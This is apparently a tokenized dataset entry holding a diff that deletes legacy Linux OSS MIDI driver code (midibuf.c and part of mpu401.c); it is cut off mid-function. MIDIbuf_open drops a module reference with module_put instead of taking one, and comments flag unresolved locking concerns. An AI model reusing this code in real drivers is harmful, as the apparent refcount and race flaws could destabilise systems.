"@", "@", "int", "midi_synth_ioctl", "(", "int", "dev", ",", "unsigned", "int", "cmd", ",", "void", "__user", "*", "arg", ")", ";", "int", "midi_synth_kill_note", "(", "int", "dev", ",", "int", "channel", ",", "int", "note", ",", "int", "velocity", ")", ";", "int", "midi_synth_set_instr", "(", "int", "dev", ",", "int", "channel", ",", "int", "instr_no", ")", ";", "int", "midi_synth_start_note", "(", "int", "dev", ",", "int", "channel", ",", "int", "note", ",", "int", "volume", ")", ";", "void", "midi_synth_reset", "(", "int", "dev", ")", ";", "int", "midi_synth_open", "(", "int", "dev", ",", "int", "mode", ")", ";", "void", "midi_synth_close", "(", "int", "dev", ")", ";", "void", "midi_synth_hw_control", "(", "int", "dev", ",", "unsigned", "char", "*", "event", ")", ";", "int", "midi_synth_load_patch", "(", "int", "dev", ",", "int", "format", ",", "const", "char", "__user", "*", "addr", ",", "int", "count", ",", "int", "pmgr_flag", ")", ";", "void", "midi_synth_panning", "(", "int", "dev", ",", "int", "channel", ",", "int", "pressure", ")", ";", "void", "midi_synth_aftertouch", "(", "int", "dev", ",", "int", "channel", ",", "int", "pressure", ")", ";", "void", "midi_synth_controller", "(", "int", "dev", ",", "int", "channel", ",", "int", "ctrl_num", ",", "int", "value", ")", ";", "void", "midi_synth_bender", "(", "int", "dev", ",", "int", "chn", ",", "int", "value", ")", ";", "void", "midi_synth_setup_voice", "(", "int", "dev", ",", "int", "voice", ",", "int", "chn", ")", ";", "int", "midi_synth_send_sysex", "(", "int", "dev", ",", "unsigned", "char", "*", "bytes", ",", "int", "len", ")", ";", "#", "ifndef", "_MIDI_SYNTH_C_", "static", "struct", "synth_info", "std_synth_info", "=", "{", "MIDI_SYNTH_NAME", ",", "0", ",", "SYNTH_TYPE_MIDI", ",", "0", ",", "0", ",", "128", ",", "0", ",", "128", ",", "MIDI_SYNTH_CAPS", "}", ";", "static", "struct", "synth_operations", "std_midi_synth", "=", "{", ".", "owner", "=", "THIS_MODULE", ",", ".", "id", "=", "\"", "MIDI", "\"", ",", ".", "info", "=", "&", "std_synth_info", ",", ".", "midi_dev", "=", "0", ",", ".", "synth_type", "=", "SYNTH_TYPE_MIDI", ",", ".", "synth_subtype", "=", "0", ",", ".", "open", "=", "midi_synth_open", ",", ".", "close", "=", "midi_synth_close", ",", ".", "ioctl", "=", "midi_synth_ioctl", ",", ".", "kill_note", "=", "midi_synth_kill_note", ",", ".", "start_note", "=", "midi_synth_start_note", ",", ".", "set_instr", "=", "midi_synth_set_instr", ",", ".", "reset", "=", "midi_synth_reset", ",", ".", "hw_control", "=", "midi_synth_hw_control", ",", ".", "load_patch", "=", "midi_synth_load_patch", ",", ".", "aftertouch", "=", "midi_synth_aftertouch", ",", ".", "controller", "=", "midi_synth_controller", ",", ".", "panning", "=", "midi_synth_panning", ",", ".", "bender", "=", "midi_synth_bender", ",", ".", "setup_voice", "=", "midi_synth_setup_voice", ",", ".", "send_sysex", "=", "midi_synth_send_sysex", "}", ";", "#", "endif", "@", "@", "-", "1", ",", "427", "+", "0", ",", "0", "@", "@", "/", "*", "*", "sound", "/", "oss", "/", "midibuf", ".", "c", "*", "*", "Device", "file", "manager", "for", "/", "dev", "/", "midi", "#", "*", "/", "/", "*", "*", "Copyright", "(", "C", ")", "by", "Hannu", "Savolainen", "1993", "-", "1997", "*", "*", "OSS", "/", "Free", "for", "Linux", "is", "distributed", "under", "the", "GNU", "GENERAL", "PUBLIC", "LICENSE", "(", "GPL", ")", "*", "Version", "2", "(", "June", "1991", ")", ".", "See", "the", "\"", "COPYING", "\"", "file", "distributed", "with", "this", "software", "*", "for", "more", "info", ".", "*", "/", "/", "*", "*", "Thomas", "Sailer", ":", "ioctl", "code", "reworked", "(", "vmalloc", "/", "vfree", "removed", ")", "*", "/", "#", "include", "<", "linux", "/", "stddef", ".", "h", ">", "#", "include", "<", "linux", "/", "kmod", ".", "h", ">", "#", "include", "<", "linux", "/", "spinlock", ".", "h", ">", "#", "include", "<", "linux", "/", "sched", "/", "signal", ".", "h", ">", "#", "define", "MIDIBUF_C", "#", "include", "\"", "sound_config", ".", "h", "\"", "/", "*", "*", "Don", "'", "t", "make", "MAX_QUEUE_SIZE", "larger", "than", "4000", "*", "/", "#", "define", "MAX_QUEUE_SIZE", "4000", "static", "wait_queue_head_t", "midi_sleeper", "[", "MAX_MIDI_DEV", "]", ";", "static", "wait_queue_head_t", "input_sleeper", "[", "MAX_MIDI_DEV", "]", ";", "struct", "midi_buf", "{", "int", "len", ",", "head", ",", "tail", ";", "unsigned", "char", "queue", "[", "MAX_QUEUE_SIZE", "]", ";", "}", ";", "struct", "midi_parms", "{", "long", "prech_timeout", ";", "/", "*", "*", "Timeout", "before", "the", "first", "ch", "*", "/", "}", ";", "static", "struct", "midi_buf", "*", "midi_out_buf", "[", "MAX_MIDI_DEV", "]", "=", "{", "NULL", "}", ";", "static", "struct", "midi_buf", "*", "midi_in_buf", "[", "MAX_MIDI_DEV", "]", "=", "{", "NULL", "}", ";", "static", "struct", "midi_parms", "parms", "[", "MAX_MIDI_DEV", "]", ";", "static", "void", "midi_poll", "(", "unsigned", "long", "dummy", ")", ";", "static", "DEFINE_TIMER", "(", "poll_timer", ",", "midi_poll", ",", "0", ",", "0", ")", ";", "static", "volatile", "int", "open_devs", ";", "static", "DEFINE_SPINLOCK", "(", "lock", ")", ";", "#", "define", "DATA_AVAIL", "(", "q", ")", "(", "q", "-", ">", "len", ")", "#", "define", "SPACE_AVAIL", "(", "q", ")", "(", "MAX_QUEUE_SIZE", "-", "q", "-", ">", "len", ")", "#", "define", "QUEUE_BYTE", "(", "q", ",", "data", ")", "\\", "if", "(", "SPACE_AVAIL", "(", "q", ")", ")", "\\", "{", "\\", "unsigned", "long", "flags", ";", "\\", "spin_lock_irqsave", "(", "&", "lock", ",", "flags", ")", ";", "\\", "q", "-", ">", "queue", "[", "q", "-", ">", "tail", "]", "=", "(", "data", ")", ";", "\\", "q", "-", ">", "len", "+", "+;", "q", "-", ">", "tail", "=", "(", "q", "-", ">", "tail", "+", "1", ")", "%", "MAX_QUEUE_SIZE", ";", "\\", "spin_unlock_irqrestore", "(", "&", "lock", ",", "flags", ")", ";", "\\", "}", "#", "define", "REMOVE_BYTE", "(", "q", ",", "data", ")", "\\", "if", "(", "DATA_AVAIL", "(", "q", ")", ")", "\\", "{", "\\", "unsigned", "long", "flags", ";", "\\", "spin_lock_irqsave", "(", "&", "lock", ",", "flags", ")", ";", "\\", "data", "=", "q", "-", ">", "queue", "[", "q", "-", ">", "head", "]", ";", "\\", "q", "-", ">", "len", "-", "-;", "q", "-", ">", "head", "=", "(", "q", "-", ">", "head", "+", "1", ")", "%", "MAX_QUEUE_SIZE", ";", "\\", "spin_unlock_irqrestore", "(", "&", "lock", ",", "flags", ")", ";", "\\", "}", "static", "void", "drain_midi_queue", "(", "int", "dev", ")", "{", "/", "*", "*", "Give", "the", "Midi", "driver", "time", "to", "drain", "its", "output", "queues", "*", "/", "if", "(", "midi_devs", "[", "dev", "]", "->", "buffer_status", "!", "=", "NULL", ")", "wait_event_interruptible_timeout", "(", "midi_sleeper", "[", "dev", "]", ",", "!", "midi_devs", "[", "dev", "]", "->", "buffer_status", "(", "dev", ")", ",", "HZ", "/", "10", ")", ";", "}", "static", "void", "midi_input_intr", "(", "int", "dev", ",", "unsigned", "char", "data", ")", "{", "if", "(", "midi_in_buf", "[", "dev", "]", "=", "=", "NULL", ")", "return", ";", "if", "(", "data", "=", "=", "0xfe", ")", "/", "*", "*", "Active", "sensing", "*", "/", "return", ";", "/", "*", "*", "Ignore", "*", "/", "if", "(", "SPACE_AVAIL", "(", "midi_in_buf", "[", "dev", "]", "))", "{", "QUEUE_BYTE", "(", "midi_in_buf", "[", "dev", "]", ",", "data", ")", ";", "wake_up", "(", "&", "input_sleeper", "[", "dev", "]", ");", "}", "}", "static", "void", "midi_output_intr", "(", "int", "dev", ")", "{", "/", "*", "*", "Currently", "NOP", "*", "/", "}", "static", "void", "midi_poll", "(", "unsigned", "long", "dummy", ")", "{", "unsigned", "long", "flags", ";", "int", "dev", ";", "spin_lock_irqsave", "(", "&", "lock", ",", "flags", ")", ";", "if", "(", "open_devs", ")", "{", "for", "(", "dev", "=", "0", ";", "dev", "<", "num_midis", ";", "dev", "+", "+)", "if", "(", "midi_devs", "[", "dev", "]", "!", "=", "NULL", "&", "&", "midi_out_buf", "[", "dev", "]", "!", "=", "NULL", ")", "{", "while", "(", "DATA_AVAIL", "(", "midi_out_buf", "[", "dev", "]", "))", "{", "int", "ok", ";", "int", "c", "=", "midi_out_buf", "[", "dev", "]", "->", "queue", "[", "midi_out_buf", "[", "dev", "]", "->", "head", "]", ";", "spin_unlock_irqrestore", "(", "&", "lock", ",", "flags", ")", ";/", "*", "Give", "some", "time", "to", "others", "*", "/", "ok", "=", "midi_devs", "[", "dev", "]", "->", "outputc", "(", "dev", ",", "c", ")", ";", "spin_lock_irqsave", "(", "&", "lock", ",", "flags", ")", ";", "if", "(", "!", "ok", ")", "break", ";", "midi_out_buf", "[", "dev", "]", "->", "head", "=", "(", "midi_out_buf", "[", "dev", "]", "->", "head", "+", "1", ")", "%", "MAX_QUEUE_SIZE", ";", "midi_out_buf", "[", "dev", "]", "->", "len", "-", "-;", "}", "if", "(", "DATA_AVAIL", "(", "midi_out_buf", "[", "dev", "]", ")", "<", "100", ")", "wake_up", "(", "&", "midi_sleeper", "[", "dev", "]", ");", "}", "poll_timer", ".", "expires", "=", "(", "1", ")", "+", "jiffies", ";", "add_timer", "(", "&", "poll_timer", ")", ";", "/", "*", "*", "Come", "back", "later", "*", "/", "}", "spin_unlock_irqrestore", "(", "&", "lock", ",", "flags", ")", ";", "}", "int", "MIDIbuf_open", "(", "int", "dev", ",", "struct", "file", "*", "file", ")", "{", "int", "mode", ",", "err", ";", "dev", "=", "dev", ">", ">", "4", ";", "mode", "=", "translate_mode", "(", "file", ")", ";", "if", "(", "num_midis", ">", "MAX_MIDI_DEV", ")", "{", "printk", "(", "KERN_ERR", "\"", "midi", ":", "Too", "many", "midi", "interfaces", "\\", "n", "\"", ");", "num_midis", "=", "MAX_MIDI_DEV", ";", "}", "if", "(", "dev", "<", "0", "|", "|", "dev", ">", "=", "num_midis", "|", "|", "midi_devs", "[", "dev", "]", "=", "=", "NULL", ")", "return", "-", "ENXIO", ";", "/", "*", "*", "Interrupts", "disabled", ".", "Be", "careful", "*", "/", "module_put", "(", "midi_devs", "[", "dev", "]", "->", "owner", ")", ";", "if", "(", "(", "err", "=", "midi_devs", "[", "dev", "]", "->", "open", "(", "dev", ",", "mode", ",", "midi_input_intr", ",", "midi_output_intr", ")", ")", "<", "0", ")", "return", "err", ";", "parms", "[", "dev", "]", ".", "prech_timeout", "=", "MAX_SCHEDULE_TIMEOUT", ";", "midi_in_buf", "[", "dev", "]", "=", "vmalloc", "(", "sizeof", "(", "struct", "midi_buf", ")", ");", "if", "(", "midi_in_buf", "[", "dev", "]", "=", "=", "NULL", ")", "{", "printk", "(", "KERN_WARNING", "\"", "midi", ":", "Can", "'", "t", "allocate", "buffer", "\\", "n", "\"", ");", "midi_devs", "[", "dev", "]", "->", "close", "(", "dev", ")", ";", "return", "-", "EIO", ";", "}", "midi_in_buf", "[", "dev", "]", "->", "len", "=", "midi_in_buf", "[", "dev", "]", "->", "head", "=", "midi_in_buf", "[", "dev", "]", "->", "tail", "=", "0", ";", "midi_out_buf", "[", "dev", "]", "=", "vmalloc", "(", "sizeof", "(", "struct", "midi_buf", ")", ");", "if", "(", "midi_out_buf", "[", "dev", "]", "=", "=", "NULL", ")", "{", "printk", "(", "KERN_WARNING", "\"", "midi", ":", "Can", "'", "t", "allocate", "buffer", "\\", "n", "\"", ");", "midi_devs", "[", "dev", "]", "->", "close", "(", "dev", ")", ";", "vfree", "(", "midi_in_buf", "[", "dev", "]", ");", "midi_in_buf", "[", "dev", "]", "=", "NULL", ";", "return", "-", "EIO", ";", "}", "midi_out_buf", "[", "dev", "]", "->", "len", "=", "midi_out_buf", "[", "dev", "]", "->", "head", "=", "midi_out_buf", "[", "dev", "]", "->", "tail", "=", "0", ";", "open_devs", "+", "+;", "init_waitqueue_head", "(", "&", "midi_sleeper", "[", "dev", "]", ");", "init_waitqueue_head", "(", "&", "input_sleeper", "[", "dev", "]", ");", "if", "(", "open_devs", "<", "2", ")", "/", "*", "This", "was", "first", "open", "*", "/", "{", "poll_timer", ".", "expires", "=", "1", "+", "jiffies", ";", "add_timer", "(", "&", "poll_timer", ")", ";", "/", "*", "Start", "polling", "*", "/", "}", "return", "err", ";", "}", "void", "MIDIbuf_release", "(", "int", "dev", ",", "struct", "file", "*", "file", ")", "{", "int", "mode", ";", "dev", "=", "dev", ">", ">", "4", ";", "mode", "=", "translate_mode", "(", "file", ")", ";", "if", "(", "dev", "<", "0", "|", "|", "dev", ">", "=", "num_midis", "|", "|", "midi_devs", "[", "dev", "]", "=", "=", "NULL", ")", "return", ";", "/", "*", "*", "Wait", "until", "the", "queue", "is", "empty", "*", "/", "if", "(", "mode", "!", "=", "OPEN_READ", ")", "{", "midi_devs", "[", "dev", "]", "->", "outputc", "(", "dev", ",", "0xfe", ")", ";", "/", "*", "*", "Active", "sensing", "to", "shut", "the", "*", "devices", "*", "/", "wait_event_interruptible", "(", "midi_sleeper", "[", "dev", "]", ",", "!", "DATA_AVAIL", "(", "midi_out_buf", "[", "dev", "]", "))", ";", "/", "*", "*", "Sync", "*", "/", "drain_midi_queue", "(", "dev", ")", ";", "/", "*", "*", "Ensure", "the", "output", "queues", "are", "empty", "*", "/", "}", "midi_devs", "[", "dev", "]", "->", "close", "(", "dev", ")", ";", "open_devs", "-", "-;", "if", "(", "open_devs", "=", "=", "0", ")", "del_timer_sync", "(", "&", "poll_timer", ")", ";", "vfree", "(", "midi_in_buf", "[", "dev", "]", ");", "vfree", "(", "midi_out_buf", "[", "dev", "]", ");", "midi_in_buf", "[", "dev", "]", "=", "NULL", ";", "midi_out_buf", "[", "dev", "]", "=", "NULL", ";", "module_put", "(", "midi_devs", "[", "dev", "]", "->", "owner", ")", ";", "}", "int", "MIDIbuf_write", "(", "int", "dev", ",", "struct", "file", "*", "file", ",", "const", "char", "__user", "*", "buf", ",", "int", "count", ")", "{", "int", "c", ",", "n", ",", "i", ";", "unsigned", "char", "tmp_data", ";", "dev", "=", "dev", ">", ">", "4", ";", "if", "(", "!", "count", ")", "return", "0", ";", "c", "=", "0", ";", "while", "(", "c", "<", "count", ")", "{", "n", "=", "SPACE_AVAIL", "(", "midi_out_buf", "[", "dev", "]", ");", "if", "(", "n", "=", "=", "0", ")", "{", "/", "*", "*", "No", "space", "just", "now", ".", "*", "/", "if", "(", "file", "-", ">", "f_flags", "&", "O_NONBLOCK", ")", "{", "c", "=", "-", "EAGAIN", ";", "goto", "out", ";", "}", "if", "(", "wait_event_interruptible", "(", "midi_sleeper", "[", "dev", "]", ",", "SPACE_AVAIL", "(", "midi_out_buf", "[", "dev", "]", "))", ")", "{", "c", "=", "-", "EINTR", ";", "goto", "out", ";", "}", "n", "=", "SPACE_AVAIL", "(", "midi_out_buf", "[", "dev", "]", ");", "}", "if", "(", "n", ">", "(", "count", "-", "c", ")", ")", "n", "=", "count", "-", "c", ";", "for", "(", "i", "=", "0", ";", "i", "<", "n", ";", "i", "+", "+)", "{", "/", "*", "BROKE", "BROKE", "BROKE", "-", "CAN", "'", "T", "DO", "THIS", "WITH", "CLI", "!", "!", "*", "/", "/", "*", "yes", ",", "think", "the", "same", ",", "so", "I", "removed", "the", "cli", "(", ")", "brackets", "QUEUE_BYTE", "is", "protected", "against", "interrupts", "*", "/", "if", "(", "copy_from_user", "(", "(", "char", "*", ")", "&", "tmp_data", ",", "&", "(", "buf", ")", "[", "c", "]", ",", "1", ")", ")", "{", "c", "=", "-", "EFAULT", ";", "goto", "out", ";", "}", "QUEUE_BYTE", "(", "midi_out_buf", "[", "dev", "]", ",", "tmp_data", ")", ";", "c", "+", "+;", "}", "}", "out", ":", "return", "c", ";", "}", "int", "MIDIbuf_read", "(", "int", "dev", ",", "struct", "file", "*", "file", ",", "char", "__user", "*", "buf", ",", "int", "count", ")", "{", "int", "n", ",", "c", "=", "0", ";", "unsigned", "char", "tmp_data", ";", "dev", "=", "dev", ">", ">", "4", ";", "if", "(", "!", "DATA_AVAIL", "(", "midi_in_buf", "[", "dev", "]", "))", "{", "/", "*", "*", "No", "data", "yet", ",", "wait", "*", "/", "if", "(", "file", "-", ">", "f_flags", "&", "O_NONBLOCK", ")", "{", "c", "=", "-", "EAGAIN", ";", "goto", "out", ";", "}", "wait_event_interruptible_timeout", "(", "input_sleeper", "[", "dev", "]", ",", "DATA_AVAIL", "(", "midi_in_buf", "[", "dev", "]", "),", "parms", "[", "dev", "]", ".", "prech_timeout", ")", ";", "if", "(", "signal_pending", "(", "current", ")", ")", "c", "=", "-", "EINTR", ";", "/", "*", "The", "user", "is", "getting", "restless", "*", "/", "}", "if", "(", "c", "=", "=", "0", "&", "&", "DATA_AVAIL", "(", "midi_in_buf", "[", "dev", "]", "))", "/", "*", "*", "Got", "some", "bytes", "*", "/", "{", "n", "=", "DATA_AVAIL", "(", "midi_in_buf", "[", "dev", "]", ");", "if", "(", "n", ">", "count", ")", "n", "=", "count", ";", "c", "=", "0", ";", "while", "(", "c", "<", "n", ")", "{", "char", "*", "fixit", ";", "REMOVE_BYTE", "(", "midi_in_buf", "[", "dev", "]", ",", "tmp_data", ")", ";", "fixit", "=", "(", "char", "*", ")", "&", "tmp_data", ";", "/", "*", "BROKE", "BROKE", "BROKE", "*", "/", "/", "*", "yes", "removed", "the", "cli", "(", ")", "brackets", "again", "should", "q", "-", ">", "len", ",", "tail", "&", "head", "be", "atomic_t", "?", "*", "/", "if", "(", "copy_to_user", "(", "&(", "buf", ")", "[", "c", "]", ",", "fixit", ",", "1", ")", ")", "{", "c", "=", "-", "EFAULT", ";", "goto", "out", ";", "}", "c", "+", "+;", "}", "}", "out", ":", "return", "c", ";", "}", "int", "MIDIbuf_ioctl", "(", "int", "dev", ",", "struct", "file", "*", "file", ",", "unsigned", "int", "cmd", ",", "void", "__user", "*", "arg", ")", "{", "int", "val", ";", "dev", "=", "dev", ">", ">", "4", ";", "if", "(", "((", "cmd", ">", ">", "8", ")", "&", "0xff", ")", "=", "=", "'", "C", "'", ")", "{", "if", "(", "midi_devs", "[", "dev", "]", "->", "coproc", ")", "/", "*", "Coprocessor", "ioctl", "*", "/", "return", "midi_devs", "[", "dev", "]", "->", "coproc", "-", ">", "ioctl", "(", "midi_devs", "[", "dev", "]", "->", "coproc", "-", ">", "devc", ",", "cmd", ",", "arg", ",", "0", ")", ";", "/", "*", "printk", "(", "\"/", "dev", "/", "midi", "%", "d", ":", "No", "coprocessor", "for", "this", "device", "\\", "n", "\"", ",", "dev", ")", ";*", "/", "return", "-", "ENXIO", ";", "}", "else", "{", "switch", "(", "cmd", ")", "{", "case", "SNDCTL_MIDI_PRETIME", ":", "if", "(", "get_user", "(", "val", ",", "(", "int", "__user", "*", ")", "arg", ")", ")", "return", "-", "EFAULT", ";", "if", "(", "val", "<", "0", ")", "val", "=", "0", ";", "val", "=", "(", "HZ", "*", "val", ")", "/", "10", ";", "parms", "[", "dev", "]", ".", "prech_timeout", "=", "val", ";", "return", "put_user", "(", "val", ",", "(", "int", "__user", "*", ")", "arg", ")", ";", "default", ":", "if", "(", "!", "midi_devs", "[", "dev", "]", "->", "ioctl", ")", "return", "-", "EINVAL", ";", "return", "midi_devs", "[", "dev", "]", "->", "ioctl", "(", "dev", ",", "cmd", ",", "arg", ")", ";", "}", "}", "}", "/", "*", "No", "kernel", "lock", "-", "fine", "*", "/", "unsigned", "int", "MIDIbuf_poll", "(", "int", "dev", ",", "struct", "file", "*", "file", ",", "poll_table", "*", "wait", ")", "{", "unsigned", "int", "mask", "=", "0", ";", "dev", "=", "dev", ">", ">", "4", ";", "/", "*", "input", "*", "/", "poll_wait", "(", "file", ",", "&", "input_sleeper", "[", "dev", "]", ",", "wait", ")", ";", "if", "(", "DATA_AVAIL", "(", "midi_in_buf", "[", "dev", "]", "))", "mask", "|", "=", "POLLIN", "|", "POLLRDNORM", ";", "/", "*", "output", "*", "/", "poll_wait", "(", "file", ",", "&", "midi_sleeper", "[", "dev", "]", ",", "wait", ")", ";", "if", "(", "!", "SPACE_AVAIL", "(", "midi_out_buf", "[", "dev", "]", "))", "mask", "|", "=", "POLLOUT", "|", "POLLWRNORM", ";", "return", "mask", ";", "}", "int", "MIDIbuf_avail", "(", "int", "dev", ")", "{", "if", "(", "midi_in_buf", "[", "dev", "]", ")", "return", "DATA_AVAIL", "(", "midi_in_buf", "[", "dev", "]", ");", "return", "0", ";", "}", "EXPORT_SYMBOL", "(", "MIDIbuf_avail", ")", ";", "@", "@", "-", "1", ",", "1804", "+", "0", ",", "0", "@", "@", "/", "*", "*", "sound", "/", "oss", "/", "mpu401", ".", "c", "*", "*", "The", "low", "level", "driver", "for", "Roland", "MPU", "-", "401", "compatible", "Midi", "cards", ".", "*", "/", "/", "*", "*", "Copyright", "(", "C", ")", "by", "Hannu", "Savolainen", "1993", "-", "1997", "*", "*", "OSS", "/", "Free", "for", "Linux", "is", "distributed", "under", "the", "GNU", "GENERAL", "PUBLIC", "LICENSE", "(", "GPL", ")", "*", "Version", "2", "(", "June", "1991", ")", ".", "See", "the", "\"", "COPYING", "\"", "file", "distributed", "with", "this", "software", "*", "for", "more", "info", ".", "*", "*", "*", "Thomas", "Sailer", "ioctl", "code", "reworked", "(", "vmalloc", "/", "vfree", "removed", ")", "*", "Alan", "Cox", "modularisation", ",", "use", "normal", "request_irq", ",", "use", "dev_id", "*", "Bartlomiej", "Zolnierkiewicz", "removed", "some", "__init", "to", "allow", "using", "many", "drivers", "*", "Chris", "Rankin", "Update", "the", "module", "-", "usage", "counter", "for", "the", "coprocessor", "*", "Zwane", "Mwaikambo", "Changed", "attach", "/", "unload", "resource", "freeing", "*", "/", "#", "include", "<", "linux", "/", "module", ".", "h", ">", "#", "include", "<", "linux", "/", "slab", ".", "h", ">", "#", "include", "<", "linux", "/", "init", ".", "h", ">", "#", "include", "<", "linux", "/", "interrupt", ".", "h", ">", "#", "include", "<", "linux", "/", "spinlock", ".", "h", ">", "#", "define", "USE_SEQ_MACROS", "#", "define", "USE_SIMPLE_MACROS", "#", "include", "\"", "sound_config", ".", "h", "\"", "#", "include", "\"", "coproc", ".", "h", "\"", "#", "include", "\"", "mpu401", ".", "h", "\"", "static", "int", "timer_mode", "=", "TMR_INTERNAL", ",", "timer_caps", "=", "TMR_INTERNAL", ";", "struct", "mpu_config", "{", "int", "base", ";", "/", "*", "*", "I", "/", "O", "base", "*", "/", "int", "irq", ";", "int", "opened", ";", "/", "*", "*", "Open", "mode", "*", "/", "int", "devno", ";", "int", "synthno", ";", "int", "uart_mode", ";", "int", "initialized", ";", "int", "mode", ";", "#", "define", "MODE_MIDI", "1", "#", "define", "MODE_SYNTH", "2", "unsigned", "char", "version", ",", "revision", ";", "unsigned", "int", "capabilities", ";", "#", "define", "MPU_CAP_INTLG", "0x10000000", "#", "define", "MPU_CAP_SYNC", "0x00000010", "#", "define", "MPU_CAP_FSK", "0x00000020", "#", "define", "MPU_CAP_CLS", "0x00000040", "#", "define", "MPU_CAP_SMPTE", "0x00000080", "#", "define", "MPU_CAP_2PORT", "0x00000001", "int", "timer_flag", ";", "#", "define", "MBUF_MAX", "10", "#", "define", "BUFTEST", "(", "dc", ")", "if", "(", "dc", "-", ">", "m_ptr", ">", "=", "MBUF_MAX", "|", "|", "dc", "-", ">", "m_ptr", "<", "0", ")", "\\", "{", "printk", "(", "\"", "MPU", ":", "Invalid", "buffer", "pointer", "%", "d", "/", "%", "d", ",", "s", "=", "%", "d", "\\", "n", "\"", ",", "dc", "-", ">", "m_ptr", ",", "dc", "-", ">", "m_left", ",", "dc", "-", ">", "m_state", ")", ";", "dc", "-", ">", "m_ptr", "-", "-;", "}", "int", "m_busy", ";", "unsigned", "char", "m_buf", "[", "MBUF_MAX", "]", ";", "int", "m_ptr", ";", "int", "m_state", ";", "int", "m_left", ";", "unsigned", "char", "last_status", ";", "void", "(", "*", "inputintr", ")", "(", "int", "dev", ",", "unsigned", "char", "data", ")", ";", "int", "shared_irq", ";", "int", "*", "osp", ";", "spinlock_t", "lock", ";", "}", ";", "#", "define", "DATAPORT", "(", "base", ")", "(", "base", ")", "#", "define", "COMDPORT", "(", "base", ")", "(", "base", "+", "1", ")", "#", "define", "STATPORT", "(", "base", ")", "(", "base", "+", "1", ")", "static", "void", "mpu401_close", "(", "int", "dev", ")", ";", "static", "inline", "int", "mpu401_status", "(", "struct", "mpu_config", "*", "devc", ")", "{", "return", "inb", "(", "STATPORT", "(", "devc", "-", ">", "base", ")", ");", "}", "#", "define", "input_avail", "(", "devc", ")", "(", "!(", "mpu401_status", "(", "devc", ")", "&", "INPUT_AVAIL", ")", ")", "#", "define", "output_ready", "(", "devc", ")", "(", "!(", "mpu401_status", "(", "devc", ")", "&", "OUTPUT_READY", ")", ")", "static", "inline", "void", "write_command", "(", "struct", "mpu_config", "*", "devc", ",", "unsigned", "char", "cmd", ")", "{", "outb", "(", "cmd", ",", "COMDPORT", "(", "devc", "-", ">", "base", ")", ");", "}", "static", "inline", "int", "read_data", "(", "struct", "mpu_config", "*", "devc", ")", "{", "return", "inb", "(", "DATAPORT", "(", "devc", "-", ">", "base", ")", ");", "}", "static", "inline", "void", "write_data", "(", "struct", "mpu_config", "*", "devc", ",", "unsigned", "char", "byte", ")", "{", "outb", "(", "byte", ",", "DATAPORT", "(", "devc", "-", ">", "base", ")", ");", "}", "#", "define", "OUTPUT_READY", "0x40", "#", "define", "INPUT_AVAIL", "0x80", "#", "define", "MPU_ACK", "0xFE", "#", "define", "MPU_RESET", "0xFF", "#", "define", "UART_MODE_ON", "0x3F", "static", "struct", "mpu_config", "dev_conf", "[", "MAX_MIDI_DEV", "]", ";", "static", "int", "n_mpu_devs", ";", "static", "int", "reset_mpu401", "(", "struct", "mpu_config", "*", "devc", ")", ";", "static", "void", "set_uart_mode", "(", "int", "dev", ",", "struct", "mpu_config", "*", "devc", ",", "int", "arg", ")", ";", "static", "int", "mpu_timer_init", "(", "int", "midi_dev", ")", ";", "static", "void", "mpu_timer_interrupt", "(", "void", ")", ";", "static", "void", "timer_ext_event", "(", "struct", "mpu_config", "*", "devc", ",", "int", "event", ",", "int", "parm", ")", ";", "static", "struct", "synth_info", "mpu_synth_info_proto", "=", "{", "\"", "MPU", "-", "401", "MIDI", "interface", "\"", ",", "0", ",", "SYNTH_TYPE_MIDI", ",", "MIDI_TYPE_MPU401", ",", "0", ",", "128", ",", "0", ",", "128", ",", "SYNTH_CAP_INPUT", "}", ";", "static", "struct", "synth_info", "mpu_synth_info", "[", "MAX_MIDI_DEV", "]", ";", "/", "*", "*", "States", "for", "the", "input", "scanner", "*", "/", "#", "define", "ST_INIT", "0", "/", "*", "Ready", "for", "timing", "byte", "or", "msg", "*", "/", "#", "define", "ST_TIMED", "1", "/", "*", "Leading", "timing", "byte", "rcvd", "*", "/", "#", "define", "ST_DATABYTE", "2", "/", "*", "Waiting", "for", "(", "nr_left", ")", "data", "bytes", "*", "/", "#", "define", "ST_SYSMSG", "100", "/", "*", "System", "message", "(", "sysx", "etc", ")", ".", "*", "/", "#", "define", "ST_SYSEX", "101", "/", "*", "System", "exclusive", "msg", "*", "/", "#", "define", "ST_MTC", "102", "/", "*", "Midi", "Time", "Code", "(", "MTC", ")", "qframe", "msg", "*", "/", "#", "define", "ST_SONGSEL", "103", "/", "*", "Song", "select", "*", "/", "#", "define", "ST_SONGPOS", "104", "/", "*", "Song", "position", "pointer", "*", "/", "static", "unsigned", "char", "len_tab", "[", "]", "=", "/", "*", "#", "of", "data", "bytes", "following", "a", "status", "*", "/", "{", "2", ",", "/", "*", "8x", "*", "/", "2", ",", "/", "*", "9x", "*", "/", "2", ",", "/", "*", "Ax", "*", "/", "2", ",", "/", "*", "Bx", "*", "/", "1", ",", "/", "*", "Cx", "*", "/", "1", ",", "/", "*", "Dx", "*", "/", "2", ",", "/", "*", "Ex", "*", "/", "0", "/", "*", "Fx", "*", "/", "}", ";", "#", "define", "STORE", "(", "cmd", ")", "\\", "{", "\\", "int", "len", ";", "\\", "unsigned", "char", "obuf", "[", "8", "]", ";", "\\", "cmd", ";", "\\", "seq_input_event", "(", "obuf", ",", "len", ")", ";", "\\", "}", "#", "define", "_seqbuf", "obuf", "#", "define", "_seqbufptr", "0", "#", "define", "_SEQ_ADVBUF", "(", "x", ")", "len", "=", "x", "static", "int", "mpu_input_scanner", "(", "struct", "mpu_config", "*", "devc", ",", "unsigned", "char", "midic", ")", "{", "switch", "(", "devc", "-", ">", "m_state", ")", "{", "case", "ST_INIT", ":", "switch", "(", "midic", ")", "{", "case", "0xf8", ":", "/", "*", "Timer", "overflow", "*", "/", "break", ";", "case", "0xfc", ":", "printk", "(", "\"<", "all", "end", ">", "\")", ";", "break", ";", "case", "0xfd", ":", "if", "(", "devc", "-", ">", "timer_flag", ")", "mpu_timer_interrupt", "(", ");", "break", ";", "case", "0xfe", ":", "return", "MPU_ACK", ";", "case", "0xf0", ":", "case", "0xf1", ":", "case", "0xf2", ":", "case", "0xf3", ":", "case", "0xf4", ":", "case", "0xf5", ":", "case", "0xf6", ":", "case", "0xf7", ":", "printk", "(", "\"<", "Trk", "data", "rq", "#", "%", "d", ">", "\",", "midic", "&", "0x0f", ")", ";", "break", ";", "case", "0xf9", ":", "printk", "(", "\"<", "conductor", "rq", ">", "\")", ";", "break", ";", "case", "0xff", ":", "devc", "-", ">", "m_state", "=", "ST_SYSMSG", ";", "break", ";", 